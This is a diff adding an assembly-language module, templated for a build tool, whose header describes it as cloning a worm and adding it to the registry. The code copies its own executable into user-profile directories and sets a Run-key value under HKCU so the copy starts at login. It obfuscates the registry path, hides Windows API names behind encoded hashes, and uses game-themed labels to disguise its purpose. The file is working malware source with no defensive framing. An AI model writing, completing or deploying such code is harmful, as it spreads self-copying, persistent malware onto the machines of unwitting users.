@@ -1,0 +1,330 @@
+#!name##DrMario
+#!types##sfile
+#!info##Clone worm and add to registry
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+%define DM_PATH_BUFFER 1024
+%define DM_ENCODE_PATH_HEX 2
+%define DM_HKEY_CURRENT_USER 0x80000001
+%define DM_KEY_READ 0x20019
+%define DM_KEY_ALL_ACCESS 0xF003F
+
+
+
+extern GetLastError
+
+section .data
+
+    dm_env_item1: db "APPDATA", 0
+    dm_env_item2: db "LOCALAPPDATA", 0
+    dm_env_item3: db "PATH", 0
+    dm_env_items: dq dm_env_item1, dm_env_item2, dm_env_item3, 0
+    
+    dm_en_name: db "{{ZAX_app_name}}", 0
+    
+    dm_pl_name: db {{TOOL.asm_hex_encrypt_bytes(WORM_NAME, 2)}}
+    
+    ; reg key path
+    dm_pl_inv: db 0x55, 0x71, 0x68, 0x76, 0x79, 0x63, 0x74, 0x67, 0x5E, 0x4F, 0x6B, 0x65, 0x74, 0x71, 0x75, 0x71, 0x68, 0x76, 0x5E, 0x59, 0x6B, 0x70, 0x66, 0x71, 0x79, 0x75, 0x5E, 0x45, 0x77, 0x74, 0x74, 0x67, 0x70, 0x76, 0x58, 0x67, 0x74, 0x75, 0x6B, 0x71, 0x70, 0x5E, 0x54, 0x77, 0x70, 0x00 
+    
+    dm_mario_gfn: dd {{TOOL.AsmSh_encode("GetModuleFileNameA")}} ; GetModuleFileNameA
+    dm_mario_cf: dd {{TOOL.AsmSh_encode("CopyFileA")}} ; CopyFileA
+    dm_mario_gev: dd {{TOOL.AsmSh_encode("GetEnvironmentVariableA")}} ; GetEnvironmentVariableA
+    dm_mario_pc: dd {{TOOL.AsmSh_encode("PathCombineA")}} ; PathCombineA
+    dm_mario_sdl: dd {{TOOL.AsmSh_encode("Shlwapi.dll")}} ; Shlwapi.dll
+    
+    dm_mario_adl: dd {{TOOL.AsmSh_encode("Advapi32.dll")}} ; Advapi32.dll
+    dm_mario_rok: dd {{TOOL.AsmSh_encode("RegOpenKeyExA")}} ; RegOpenKeyExA
+    dm_mario_rsv: dd {{TOOL.AsmSh_encode("RegSetValueExA")}} ; RegSetValueExA
+    dm_mario_rck: dd {{TOOL.AsmSh_encode("RegCloseKey")}} ; RegCloseKey
+
+{% set _ = TOOL.AsmSh_reset_table() %}   
+    
+section .bss
+    dm_player_start: resb DM_PATH_BUFFER    ; main file path
+    dm_player_equ: resb DM_PATH_BUFFER  ; env var path
+    dm_player_att: resb DM_PATH_BUFFER  ; final patch
+    dm_player_life: resb DM_PATH_BUFFER ; buffer for decoded text
+    dm_enemy_life: resb DM_PATH_BUFFER  ; registry value buffer
+    dm_enemy_mana: resq 1   ; registry key handle
+
+section .text
+
+%macro MACRO_DM_load_encode 1
+    push rsi
+    push rdi
+    push rbx
+    push rcx
+    push rdx
+    
+
+    lea rdi, [dm_player_life]
+    mov rcx, DM_PATH_BUFFER
+    xor rax, rax
+    cld
+    rep stosb
+        
+    
+    xor rbx, rbx    ; temp
+    xor rcx, rcx    ; counter
+    lea rsi, [%1]
+    lea rdi, [dm_player_life]
+    %%copy:
+        mov byte bl, [rsi + rcx]
+        cmp bl, 0
+        je %%end
+        sub bl, DM_ENCODE_PATH_HEX
+        mov byte [rdi + rcx], bl
+        inc rcx
+        jmp %%copy
+    
+    %%end:
+        pop rdx
+        pop rcx
+        pop rbx
+        pop rdi
+        pop rsi
+        
+    
+
+%endmacro
+
+DM_start_heal:
+; attempt to clone and add to the registry
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    ;try copy
+    sub rsp, 40
+    call DM_heal
+    add rsp, 40
+    cmp rax, 0
+    je .return
+    
+    ; try add to registry
+    sub rsp, 40
+    mov rcx, rax
+    call DM_place_item
+    add rsp, 40
+    
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+
+DM_place_item:
+; Try add to registry
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - pointer to file path
+; OUT: rax - False (0) or number (True)
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; file path
+    
+    ; build reg path
+    
+    xor rbx, rbx    ; counter
+    xor rsi, rsi
+    lea rdi, [dm_enemy_life]
+    mov byte [rdi], 0x22    ; put " as first byte
+    .build_path:
+        mov byte sil, [rcx + rbx]   ; byte from reg path
+        cmp sil, 0
+        je .build_path_end
+        mov byte [rdi + rbx + 1], sil   ; put byte to new reg path
+        inc rbx ; counter + 1
+        jmp .build_path
+    
+    .build_path_end:
+        mov byte [rdi + rbx + 1], 0x22  ; put " as last byte
+    
+
+    
+    ; open registry key
+    MACRO_DM_load_encode dm_pl_inv
+    sub rsp, 40
+    mov rcx, dm_mario_rok
+    mov rdx, dm_mario_adl
+    call PITF_get
+    add rsp, 40
+    
+    sub rsp, 56
+    mov rcx, DM_HKEY_CURRENT_USER   ; A handle to an open registry key.
+    lea rdx, [dm_player_life]   ; The name of the registry subkey to be opened.
+    xor r8, r8  ; Specifies the option to apply when opening the key. Set this parameter to zero
+    mov r9, DM_KEY_ALL_ACCESS ; A mask that specifies the desired access rights to the key to be opened
+    lea rbx, [dm_enemy_mana]
+    mov [rsp+32], rbx   ; A pointer to a variable that receives a handle to the opened key
+    call rax    ; call RegOpenKeyExA
+    add rsp, 56
+    
+    
+    ; match path length
+    xor rbx, rbx    ; counter
+    lea rsi, [dm_enemy_life]
+    xor rdi, rdi
+    .match_len:
+        mov byte dil, [rsi + rbx]
+        cmp dil, 0
+        je .match_end
+        inc rbx
+        jmp .match_len
+        
+    .match_end:
+        mov [rbp-16], rbx   ; save length
+    
+    ; add registry key
+    sub rsp, 40
+    mov rcx, dm_mario_rsv
+    mov rdx, dm_mario_adl
+    call PITF_get
+    add rsp, 40
+    
+    sub rsp, 56
+    lea rcx, [dm_enemy_mana]
+    mov rcx, [rcx]  ; key handle
+    mov rdx, dm_en_name ; The name of the value to be set
+    xor r8, r8  ; This parameter is reserved and must be zero
+    mov r9d, 1  ; The type of data pointed to by the lpData parameter. ex REG_SZ. '1' - REG_SZ
+    lea rbx, [dm_enemy_life]
+    mov [rsp+32], rbx   ; The data to be stored. 
+    mov rbx, [rbp-16]   ; get data length
+    mov [rsp+40], rbx   ; The size of the information pointed to by the lpData parameter, in bytes.
+    call rax    ; call RegSetValueExA
+    add rsp, 56
+    
+    
+    ; close key
+    sub rsp, 40
+    mov rcx, dm_mario_rck
+    mov rdx, dm_mario_adl
+    call PITF_get
+    lea rcx, [dm_enemy_mana]
+    mov rcx, [rcx]
+    call rax    ; call RegCloseKey
+    add rsp, 40
+    
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+DM_heal:
+; trying copy yourself
+; REQUIREMENTS: stack allign to 16
+; OUT: rax - file path (True) or '0' (False)
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    xor r12, r12    ; counter
+    .main_loop:
+        lea rcx, [dm_env_items]
+        mov rcx, [rcx + 8 * r12]
+        cmp rcx, 0
+        je .return_null
+        sub rsp, 40
+        call DM_heal_player
+        add rsp, 40
+        cmp rax, 0
+        je .next_step
+        
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+     
+    .return_null:
+        xor rax, rax
+        jmp .return
+    
+    .next_step:
+        inc r12
+        jmp .main_loop
+        
+
+DM_heal_player:
+; copy yourself to target location
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - env variable name 'APPDATA' etc.
+; OUT: rax - file path (True) or '0' (False)
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; env var name
+    
+    ; get main file patch
+    sub rsp, 40
+    mov rcx, dm_mario_gfn
+    mov rdx, 0
+    call PITF_get
+    mov rcx, 0
+    lea rdx, [dm_player_start]
+    mov r8, DM_PATH_BUFFER
+    call rax ; call GetModuleFileNameA
+    add rsp, 40
+    
+    
+    ; get env var
+    sub rsp, 40
+    mov rcx, dm_mario_gev
+    mov rdx, 0
+    call PITF_get
+    mov rcx, [rbp-8]
+    lea rdx, [dm_player_equ]
+    mov r8, DM_PATH_BUFFER
+    call rax    ; call GetEnvironmentVariableA
+    add rsp, 40
+    cmp rax, 0
+    je .return_null
+    
+    sub rsp, 40
+    mov rcx, text_out
+    lea rdx, [dm_player_equ]
+    call printf
+    add rsp, 40
+    
+    ; build target file path
+    MACRO_DM_load_encode dm_pl_name
+    sub rsp, 40
+    mov rcx, dm_mario_pc
+    mov rdx, dm_mario_sdl
+    call PITF_get
+    lea rcx, [dm_player_att]    ; final path
+    lea rdx, [dm_player_equ]    ; first part path
+    lea r8, [dm_player_life]    ; second part path
+    call rax    ; call PathCombineA
+    mov rcx, text_out
+    lea rdx, [dm_player_att]
+    call printf
+    add rsp, 40
+    
+    ; try copy
+    sub rsp, 40
+    mov rcx, dm_mario_cf
+    mov rdx, 0
+    call PITF_get
+    lea rcx, [dm_player_start]
+    lea rdx, [dm_player_att]
+    mov r8, 0   ; overwrites the existing file
+    call rax    ;call CopyFileA
+    add rsp, 40
+    cmp rax, 0
+    je .return_null
+    lea rax, [dm_player_att]    ;return path
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+        
+    .return_null:
+        xor rax, rax
+        jmp .return
